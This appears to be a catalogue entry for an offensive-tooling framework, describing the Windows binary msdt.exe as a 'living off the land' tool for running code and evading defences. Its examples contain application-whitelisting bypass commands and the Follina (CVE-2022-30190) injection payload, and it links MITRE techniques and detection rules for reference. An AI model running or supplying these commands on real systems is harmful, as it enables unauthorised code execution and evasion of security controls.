---
id: windows-bypass-msdt
namespace: windows:bypass:msdt
name: msdt
description: 'Microsoft diagnostics tool Located at: C:\Windows\System32\Msdt.exe;
  C:\Windows\SysWOW64\Msdt.exe.'
author: Oddvar Moe
version: 1.0.0
capabilities:
- security.execution.command
- security.defense-evasion.bypass
platforms:
- windows
risk_level: high
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - process_spawn
  resource_cost:
    cpu: low
    memory_mb: 16
    network: low
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: low
  disk_io: low
allowed-tools:
- msdt
parameters: []
features:
- pipes-stdin
- pipes-stdout
- stealth
execution:
  template: msdt
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: Executes the Microsoft Diagnostics Tool and executes the malicious
    .MSI referenced in the .xml file. (Execute code)
  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
    /skip TRUE
- description: Executes the Microsoft Diagnostics Tool and executes the malicious
    .MSI referenced in the .xml file. (Execute code bypass Application whitelisting)
  command: msdt.exe -path C:\WINDOWS\diagnostics\index\PCWDiagnostic.xml -af {PATH_ABSOLUTE:.xml}
    /skip TRUE
- description: Executes arbitrary commands using the Microsoft Diagnostics Tool and
    leveraging the "PCWDiagnostic" module (CVE-2022-30190). Note that this specific
    technique will not work on a patched system with the June 2022 Windows Security
    update. (Execute code bypass Application allowlisting)
  command: msdt.exe /id PCWDiagnostic /skip force /param "IT_LaunchMethod=ContextMenu
    IT_BrowseForFile=/../../$(calc).exe"
references:
- label: ''
  url: https://web.archive.org/web/20160322142537/https://cybersyndicates.com/2015/10/a-no-bull-guide-to-malicious-windows-trouble-shooting-packs-and-application-whitelist-bypass/
- label: ''
  url: https://oddvar.moe/2017/12/21/applocker-case-study-how-insecure-is-it-really-part-2/
- label: '991338229952598016'
  url: https://twitter.com/harr0ey/status/991338229952598016
- label: '1531944240271568896'
  url: https://twitter.com/nas_bench/status/1531944240271568896
techniques:
- execution
- defense-evasion
mitre_ids:
- T1218
- T1202
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/6199a703221a98ae6ad343c79c558da375203e4e/rules/windows/process_creation/proc_creation_win_lolbin_msdt_answer_file.yml
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/c04bef2fbbe8beff6c7620d5d7ea6872dbe7acba/rules/windows/process_creation/proc_creation_win_msdt_arbitrary_command_execution.yml
- type: elastic
  url: https://github.com/elastic/detection-rules/blob/414d32027632a49fb239abb8fbbb55d3fa8dd861/rules/windows/defense_evasion_network_connection_from_windows_binary.toml
install:
- method: choco
  package_name: msdt
  commands:
  - choco install msdt
---

# msdt

msdt is a Windows LOLBin. Microsoft diagnostics tool Located at: C:\Windows\System32\Msdt.exe; C:\Windows\SysWOW64\Msdt.exe.
